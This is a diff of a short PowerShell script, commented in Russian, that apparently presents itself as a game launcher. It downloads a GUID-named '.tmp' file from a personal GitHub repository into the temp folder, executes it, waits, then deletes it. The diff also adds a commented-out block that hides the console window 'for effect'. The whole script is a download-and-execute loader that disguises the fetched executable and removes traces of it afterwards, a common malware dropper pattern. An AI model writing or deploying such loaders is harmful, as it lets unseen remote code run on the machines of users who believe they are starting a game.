@@ -1,24 +1,18 @@
 $ErrorActionPreference = "Stop"
 
+# Прячем окно консоли на время (опционально, для эффекта)
+# Add-Type -Name Window -Namespace Console -MemberDefinition '
+# [DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+# [DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
+# $consolePtr = [Console.Window]::GetConsoleWindow()
+# [Console.Window]::ShowWindow($consolePtr, 0) # 0 = скрыть
+
 $GameUrl = "https://github.com/tema132b-arch/testz/raw/main/e1090ed9-44f0-4a4a-b228-e41aa7662bd4.tmp"
-$TempFile = Join-Path ([IO.Path]::GetTempPath()) "e1090ed9-44f0-4a4a-b228-e41aa7662bd4.tmp"
+$TempExe = Join-Path ([IO.Path]::GetTempPath()) "e1090ed9-44f0-4a4a-b228-e41aa7662bd4.tmp"
 
-# Скачиваем файл
-Invoke-WebRequest -Uri $GameUrl -OutFile $TempFile -UseBasicParsing
+Invoke-WebRequest -Uri $GameUrl -OutFile $TempExe -UseBasicParsing
 
-# Настраиваем запуск через .NET
-$psi = New-Object System.Diagnostics.ProcessStartInfo
-$psi.FileName = $TempFile
-$psi.UseShellExecute = $false          # Отключаем оболочку Windows
-$psi.RedirectStandardOutput = $false   # Не перенаправляем вывод (GUI-приложению не нужно)
-$psi.RedirectStandardError = $false
-$psi.CreateNoWindow = $false           # Окно игры должно быть видимым
-
-# Запускаем процесс
-$proc = [System.Diagnostics.Process]::Start($psi)
-
-# Ждём завершения
+$proc = Start-Process -FilePath $TempExe -PassThru
 $proc.WaitForExit()
 
-# Удаляем файл после закрытия
-Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
+Remove-Item $TempExe -Force -ErrorAction SilentlyContinue
